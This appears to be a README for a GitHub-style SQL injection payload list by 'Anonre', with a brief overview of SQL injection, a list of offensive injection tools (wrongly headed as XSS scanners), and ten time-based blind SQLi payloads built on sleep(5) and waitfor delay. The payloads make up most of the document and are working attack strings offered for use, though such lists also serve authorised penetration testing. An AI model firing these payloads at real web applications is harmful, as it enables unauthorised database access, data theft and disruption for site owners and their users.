### SQL Injction ( SQLI ) Payload List
### Created By Anonre

##### Overview : 

SQL injection is a code injection technique that might destroy your database. SQL injection is one of the most common web hacking techniques. SQL injection is the placement of malicious code in SQL statements, via web page input.
#### XSS Vulneability Scanner Tool's :

SQLMap - Automatic SQL Injection And Database Takeover Tool
jSQL Injection - Java Tool For Automatic SQL Database Injection
BBQSQL - A Blind SQL Injection Exploitation Tool
NoSQLMap - Automated NoSQL Database Pwnage
Whitewidow - SQL Vulnerability Scanner
DSSS - Damn Small SQLi Scanner
explo - Human And Machine Readable Web Vulnerability Testing Format
Blind-Sql-Bitshifting - Blind SQL Injection via Bitshifting
Leviathan - Wide Range Mass Audit Toolkit
Blisqy - Exploit Time-based blind-SQL injection in HTTP-Headers (MySQL/MariaDB)


#### SQLI Payload List :

```
---------------------------------------------------------------------------------
<!-- Project Name  : SQL Injction ( SQLI ) Vulnerability Payload List -->
<!--        Author : Joel Indra -->
<!--      Linkedin : https://www.linkedin.com/in/joelindra/ -->
<!--        GitHub : https://github.com/anonre/ -->
<!--       Twitter : https://twitter.com/joelindra -->
---------------------------------------------------------------------------------
---------------------------------------------------------------------------------

" or sleep(5)="
' or sleep(5)='
1) or sleep(5)#
") or sleep(5)="
') or sleep(5)='
1)) or sleep(5)#
")) or sleep(5)="
')) or sleep(5)='
;waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--
